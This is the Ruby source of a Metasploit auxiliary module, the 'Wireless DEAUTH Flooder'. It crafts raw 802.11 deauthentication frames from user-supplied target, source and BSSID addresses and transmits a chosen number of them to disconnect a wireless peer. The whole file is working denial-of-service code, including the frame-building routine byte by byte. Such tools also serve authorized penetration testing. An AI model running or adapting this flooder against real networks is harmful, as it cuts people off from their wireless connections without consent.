##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Lorcon2
  include Msf::Auxiliary::Dos

  def initialize(info ={})
    super(update_info(info,
      'Name'		=> 'Wireless DEAUTH Flooder',
      'Description' 	=> %q{
          This module sends 802.11 DEAUTH requests to a specific wireless peer,
        using the specified source address and source BSSID.
      },

      'Author'	=> [ 'Brad Antoniewicz' ],
      'License'	=> MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('ADDR_DST',[true, "TARGET MAC (e.g 00:DE:AD:BE:EF:00)"]),
        OptString.new('ADDR_SRC',[true, "Source MAC (e.g 00:DE:AD:BE:EF:00)"]),
        OptString.new('ADDR_BSS',[true, "BSSID (e.g 00:DE:AD:BE:EF:00)"]),
        OptInt.new('NUM',[true, "Number of frames to send",100])
      ],self.class)
  end

  def run

    print_status("Creating Deauth frame with the following attributes:")
    print_status("\tDST: #{datastore['ADDR_DST']}")
    print_status("\tSRC: #{datastore['ADDR_SRC']}")
    print_status("\tBSSID: #{datastore['ADDR_BSS']}")

    open_wifi

    print_status("Sending #{datastore['NUM']} frames.....")

    datastore['NUM'].to_i.times do
      wifi.write(create_deauth())
    end
    close_wifi
  end

  def create_deauth

    seq = [rand(255)].pack('n')
    frame =
      "\xc0" +			# Type/SubType
      "\x00" +			# Flags
      "\x3a\x01" +			# Duration
      eton(datastore['ADDR_DST']) +	# dst addr
      eton(datastore['ADDR_SRC']) +	# src addr
      eton(datastore['ADDR_BSS']) +	# BSSID
      seq +				# sequence number
      "\x07\x00"			# Reason Code (nonassoc. sta)
    return frame
  end
end
